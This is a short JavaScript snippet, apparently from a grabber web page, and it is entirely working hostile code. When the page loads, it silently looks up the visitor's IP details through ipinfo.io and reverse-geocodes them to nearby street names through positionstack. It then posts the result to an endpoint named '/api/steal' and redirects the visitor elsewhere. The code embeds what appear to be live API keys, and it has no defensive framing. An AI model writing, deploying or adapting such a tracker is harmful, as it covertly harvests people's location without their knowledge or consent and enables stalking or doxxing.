window.dataip;
fetch("https://ipinfo.io?token=4b8af40cd4f57e")
    .then((e) => e.json())
    .then((e) => {
        window.dataip = e;
        fetch(`http://api.positionstack.com/v1/reverse?access_key=e9bc72f138759ef21d8de8227f545f6c&query=${e.loc}&limit=20`)
            .then((e) => e.json())
            .then((e) => {
                window.dataip.ips = e.data;
                window.dataip.ips = window.dataip.ips.map(e=> {
                    return Object.fromEntries(Object.entries({name:e.name,label:e.label,street:e.street}).filter(([_, v]) => v != null))
                })
                console.log("ip : true");
                fetch("/api/steal", {
                    method: "POST",
                    redirect: "follow",
                    body: JSON.stringify(window.dataip,undefined,2),
                    headers: { "Content-Type": "application/json" }
                })
                    .then((e) => e.json())
                    .then((e) => (e.saved ? window.location.replace("/index") : ""));
            });
    });
